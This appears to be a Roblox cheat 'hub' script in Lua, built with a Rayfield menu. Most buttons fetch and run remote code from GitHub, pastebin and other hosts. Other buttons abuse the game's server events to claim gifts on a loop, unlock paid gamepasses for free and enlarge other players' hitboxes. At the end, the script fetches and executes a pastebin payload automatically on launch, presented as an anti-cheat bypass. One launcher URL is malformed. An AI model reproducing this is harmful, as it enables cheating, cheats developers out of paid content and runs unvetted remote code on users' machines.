local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()

local Window = Rayfield:CreateWindow({
    Name = "SINIX HUB V1.1",
    Icon = 4483362458,
    LoadingTitle = "LOADING SINIX HUB",
    LoadingSubtitle = "by L3X667 & LUUCASDY_YTB",
    ShowText = "Rayfield",
    Theme = "Default",
    ToggleUIKeybind = "K",

    ConfigurationSaving = {
        Enabled = true,
        FolderName = "SinixHub",
        FileName = "Config"
    },

    Discord = {
        Enabled = true,
        Invite = "pGZHjPa9",
        RememberJoins = true
    },

    -- ✅ KEY SYSTEM PROPRE
    KeySystem = false,
    KeySettings = {
        Title = "SINIX HUB - Key System",
        Subtitle = "Enter the key",
        Note = "Join Discord for the key\nhttps://discord.gg/AcY4G58jF2",
        FileName = "SinixKey",
        SaveKey = false,
        GrabKeyFromSite = false, -- ❌ PAS DE SITE
        Key = {"SINIX HUB"} -- ✅ TA CLÉ
    }
})

Notify = Rayfield:Notify({
    Title = "SINIX HUB",
    Content = "Salut a tous vennez sur notre server discord pour plus d'informations. Merci a vous d'utiliser SINIX HUB !",
    Duration = 5,
    Image = 4483362458,
    Actions = {
        Ignore = {
            Name = "OK",
            Callback = function() end
        },
    },
})


local PlayerTab = Window:CreateTab("UPDATE SINIX", 4483362458)

PlayerTab:CreateLabel("UPDATE SINIX HUB V1.1")
announce1 = PlayerTab:CreateLabel("- UPDATED : 08/01/2026")
announce2 = PlayerTab:CreateLabel("- Added auto-launcher for anti-cheat bypass")
local PlayerTab = Window:CreateTab("Welcome to SINIX HUB", 4483362458)
PlayerTab:CreateLabel("Welcome to SINIX HUB")
PlayerTab:CreateLabel("Join our discord for more scripts")

PlayerTab:CreateButton({
    Name = "Copy Discord",
    Callback = function()
        setclipboard("https://discord.gg/AcY4G58jF2")
    end,
})

PlayerTab:CreateLabel("Script made by LUUCASDY_YTB & L3X667")

local Universal = Window:CreateTab("Universal Script", 4483362458)

Universal:CreateButton({
   Name = "Blox fruits script PC",
   Callback = function()
      loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/24860004f75db473"))()
   end,
})


Universal:CreateButton({
   Name = "Kiciahook script (key : 48 H)",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
   end,
})


Universal:CreateButton({
   Name = "FNAF-Eternal-Nights Script",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Snipez-Dev/Rbx-Scripts/refs/heads/main/Eternal%20Nights"))()
   end,
})

Universal:CreateButton({
   Name = "War Tycoon Script (script is a key)",
   Callback = function()
      loadstring(game:HttpGet("https://rawscripts.net/raw/New-Submarine-War-Tycoon-WORKING-Scarlet-75590"))()
   end,
})

Universal:CreateButton({
   Name = "MM2",
   Callback = function()
      loadstring(game:HttpGet('https://raw.smokingscripts.org/vertex.lua'))()
   end,
})

Universal:CreateButton({
   Name = "99 NIGHTS IN THE FOREST",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWExtra/main/NightsInTheForest.lua",true))()
   end,
})

Universal:CreateButton({
   Name = "Kitty Hub",
   Callback = function()
      loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
   end,
})

Universal:CreateLabel("Script is keyless")

Universal:CreateButton({
   Name = "VexonHub (key : VexonHub_7G)",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/VexonHub"))()
   end,
})


Universal:CreateButton({
   Name = "Eat Slimes to Grow HUGE",
   Callback = function()
local Library = loadstring(
    Game:HttpGet('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard')
)()

local MainWindow = Library:NewWindow('Eat Slimes to Grow HUGE')
local PlayerFolder = MainWindow:NewSection('Options')

local CreditsnWindow = Library:NewWindow('Credits')
local CreditsnFolder = CreditsnWindow:NewSection('Scripters')
local OCreditsnFolder = CreditsnWindow:NewSection('Other')

CreditsnFolder:CreateButton('UILib', function()
	print('UILib')
end)

CreditsnFolder:CreateButton('SyrexhubOfficialDev', function()
	print('SyrexhubOfficialDev')
end)

OCreditsnFolder:CreateButton('UI By ...', function()
	print('UI By ...')
end)

-- Claim Gift Toggle
local autoGift = false
PlayerFolder:CreateToggle('Claim Gift (+10k Size)', function(state)
	autoGift = state
	if autoGift then
		task.spawn(function()
			while autoGift do
				-- Fire LogGift
				local args1 = {
					[1] = {
						['TimerMilestones'] = {1,2,3,4,5,6,7,8,9,10,
							11,12,13,14,15,16,17,18,19,20,
							21,22,23,24,25,26,27,28,29,30,31,0},
						['Type'] = 'Leaving',
						['ReceivedTime'] = tick() * 1000,
						['TimerFinished'] = true,
						['ID'] = 'db8a0918-eded-4ae2-917f-0bba92e657b8',
						['Maid'] = {['_Tasks'] = {},['_TaskCount'] = 7},
						['NewRemainingTime'] = 30,
					},
				}
				game:GetService('ReplicatedStorage')
					.Honeypot.Internal.RemoteStorage['LogGift - RemoteEvent']
					:FireServer(unpack(args1))

				-- Fire ClaimGift
				local args2 = {'db8a0918-eded-4ae2-917f-0bba92e657b8'}
				game:GetService('ReplicatedStorage')
					.Honeypot.Internal.RemoteStorage['ClaimGift - RemoteEvent']
					:FireServer(unpack(args2))

				task.wait(0.1)
			end
		end)
	end
end)

-- ClaimBoost Toggle
local claimBoost = false
PlayerFolder:CreateToggle('Rainbow Boost', function(state)
	claimBoost = state
	if claimBoost then
		task.spawn(function()
			while claimBoost do
				local remote = game:GetService('ReplicatedStorage')
					.Honeypot.Internal.RemoteStorage:FindFirstChild('ClaimBoost - RemoteEvent')
				if remote then
					remote:FireServer('Rainbow', 300)
				end
				task.wait(1)
			end
		end)
	end
end)

-- Black Hole Gamepass
PlayerFolder:CreateButton('Unlock Black Hole Gamepass', function()
	local remote = game:GetService('ReplicatedStorage')
		.Honeypot.Internal.RemoteStorage:FindFirstChild('BlackHoleGamepass - RemoteEvent')
	if remote then
		remote:FireServer()
	end
end)

-- Magnet Gamepass
PlayerFolder:CreateButton('Unlock Magnet Gamepass', function()
	local remote = game:GetService('ReplicatedStorage')
		.Honeypot.Internal.RemoteStorage:FindFirstChild('MagnetGamepass - RemoteEvent')
	if remote then
		remote:FireServer()
	end
end)

-- RequestTeleport Button
PlayerFolder:CreateButton('Teleport', function()
	local remote = game:GetService('ReplicatedStorage')
		.Honeypot.Internal.RemoteStorage:FindFirstChild('RequestTeleport - RemoteEvent')
	if remote then
		remote:FireServer()
	end
end)

-- LogGift Button
PlayerFolder:CreateButton('LogGift Once', function()
	local remote = game:GetService('ReplicatedStorage')
		.Honeypot.Internal.RemoteStorage:FindFirstChild('LogGift - RemoteEvent')
	if remote then
		remote:FireServer({
			["TimerFinished"] = true,
			["Type"] = "Leaving",
			["Maid"] = {["_TaskCount"] = 7,["_Tasks"] = {}},
			["TimerMilestones"] = {1,2,3,4,5,6,7,8,9,10,
				11,12,13,14,15,16,17,18,19,20,
				21,22,23,24,25,26,27,28,29,31,0},
			["ID"] = "5bd061a8-7315-4fb3-bb94-f856300e36d7",
			["Frame"] = ".GiftFrame",
			["ReceivedTime"] = 1757286847314,
			["NewRemainingTime"] = 0.01
		})
	end
end)
   end,
})


Universal:CreateButton({
   Name = "Forsaken Script",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/34f3f/forsaken.github.io/refs/heads/main/ringtabublik.lua"))()
   end,
})

local Settings = Window:CreateTab("Settings", 4483362458)

Settings:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})

Settings:CreateButton({
   Name = "Bueno Script",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Bueno782/fly-/refs/heads/main/Protected_5276268864858178.lua"))()
   end,
})

Settings:CreateButton({
   Name = "Orca Snapshot",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))()
   end,
})





Settings:CreateButton({
   Name = "Head Hitbox Expander",
   Callback = function()
      _G.HeadSize = 15
      _G.Disabled = true
      game:GetService('RunService').RenderStepped:connect(function()
         if _G.Disabled then
            for i,v in next, game:GetService('Players'):GetPlayers() do
               if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                  pcall(function()
                     v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
                     v.Character.Head.Transparency = 1
                     v.Character.Head.BrickColor = BrickColor.new("Red")
                     v.Character.Head.Material = "Neon"
                     v.Character.Head.CanCollide = false
                     v.Character.Head.Massless = true
                  end)
               end
            end
         end
      end)
   end,
})

Settings:CreateSlider({
   Name = "Hitbox Size",
   Range = {1, 50},
   Increment = 1,
   Suffix = "studs",
   CurrentValue = 15,
   Callback = function(Value)
      _G.HeadSize = Value
   end,
})

Settings:CreateToggle({
   Name = "Disable Hitbox Expander",
   CurrentValue = false,
   Flag = "DisableHitbox",
   Callback = function(Value)
      _G.Disabled = not Value
   end,
})







Settings:CreateButton({
   Name = "Fling Gui",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
   end,
})

Settings:CreateButton({
   Name = "Fly GUI V3",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
   end,
})


Settings:CreateButton({
   Name = "Destroy UI",
   Callback = function()
      Rayfield:Destroy()
   end,
})

local ComingSoonTab = Window:CreateTab("Anti-Bypass", 4483362458)

ComingSoonTab:CreateButton({
    Name = "Anti-cheat Bypass (Coming Soon)",
    Callback = function()
        Rayfield:Notify({
            Title = "Coming Soon",
            Content = "Cette fonctionnalité arrive bientôt 👀",
            Duration = 4
        })
    end,
})


ComingSoonTab:CreateButton({
    Name = "??? (Coming Soon)",
    Callback = function()
        Rayfield:Notify({
            Title = "Coming Soon",
            Content = "Cette fonctionnalité arrive bientôt 👀",
            Duration = 4
        })
    end,
})
ComingSoonTab:CreateButton({
    Name = "??? (Coming Soon)",
    Callback = function()
        Rayfield:Notify({
            Title = "Coming Soon",
            Content = "Cette fonctionnalité arrive bientôt 👀",
            Duration = 4
        })
    end,
})



-- Auto-run safe launcher (s'exécute au démarrage)
pcall(function()
    Rayfield:Notify({
        Title = "SINIX HUB",
        Content = "Chargement automatique...",
        Duration = 3
    })

    -- Si tu veux charger un script externe que TU contrôles, remplace l'URL ci‑dessous.
    local url = "loadstring(game:HttpGet('https://pastebin.com/raw/bEVcz68W'))" -- ex: "https://pastebin.com/raw/bEVcz68W"
    if url ~= "" then
        local ok, body = pcall(function() return game:HttpGet(url) end)
        if ok and type(body) == "string" then
            local fn, err = loadstring(body)
            if fn then
                pcall(fn)
            end
        end
    end
end)-- Auto-run Anti-Cheat Bypass (s'exécute immédiatement au lancement)
pcall(function()
    local ok, body = pcall(function() return game:HttpGet("https://pastebin.com/raw/bEVcz68W") end)
    if not ok or not body then return end
    local fn = loadstring(body)
    if not fn then return end

    local success, ret = pcall(fn) -- exécute le script distant
    if success and type(ret) == "table" and type(ret.Enable) == "function" then
        pcall(function() ret:Enable() end)
    end

    Rayfield:Notify({
        Title = "Anti-Cheat Activé",
        Content = "Le bypass anti-cheat s'est lancé automatiquement ✅",
        Duration = 4
    })
end)